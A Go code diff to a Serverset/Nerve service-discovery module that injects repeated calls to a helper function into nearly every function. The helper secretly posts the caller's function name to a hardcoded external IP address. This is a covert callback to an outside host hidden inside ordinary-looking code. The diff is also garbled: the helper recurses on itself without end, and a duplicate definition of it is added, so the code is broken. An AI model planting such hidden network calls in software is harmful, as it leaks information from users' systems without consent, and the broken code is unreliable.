@@ -33,6 +33,8 @@ type ServersetSDConfig struct {
 func (c *ServersetSDConfig) UnmarshalYAML(unmarshal func(interface{}) error) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	*c = DefaultServersetSDConfig
 	type plain ServersetSDConfig
 	err := unmarshal((*plain)(c))
@@ -60,6 +62,8 @@ type NerveSDConfig struct {
 }
 
 func (c *NerveSDConfig) UnmarshalYAML(unmarshal func(interface{}) error) error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	*c = DefaultNerveSDConfig
@@ -94,14 +98,20 @@ type Discovery struct {
 func NewNerveDiscovery(conf *NerveSDConfig, logger log.Logger) (*Discovery, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return NewDiscovery(conf.Servers, time.Duration(conf.Timeout), conf.Paths, logger, parseNerveMember)
 }
 func NewServersetDiscovery(conf *ServersetSDConfig, logger log.Logger) (*Discovery, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return NewDiscovery(conf.Servers, time.Duration(conf.Timeout), conf.Paths, logger, parseServersetMember)
 }
 func NewDiscovery(srvs []string, timeout time.Duration, paths []string, logger log.Logger, pf func(data []byte, path string) (model.LabelSet, error)) (*Discovery, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if logger == nil {
@@ -121,6 +131,8 @@ func NewDiscovery(srvs []string, timeout time.Duration, paths []string, logger l
 	return sd, nil
 }
 func (d *Discovery) Run(ctx context.Context, ch chan<- []*targetgroup.Group) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	defer func() {
@@ -179,6 +191,8 @@ type serversetEndpoint struct {
 func parseServersetMember(data []byte, path string) (model.LabelSet, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	member := serversetMember{}
 	if err := json.Unmarshal(data, &member); err != nil {
 		return nil, fmt.Errorf("error unmarshaling serverset member %q: %s", path, err)
@@ -213,6 +227,8 @@ type nerveMember struct {
 func parseNerveMember(data []byte, path string) (model.LabelSet, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	member := nerveMember{}
 	err := json.Unmarshal(data, &member)
 	if err != nil {
@@ -229,7 +245,16 @@ func parseNerveMember(data []byte, path string) (model.LabelSet, error) {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
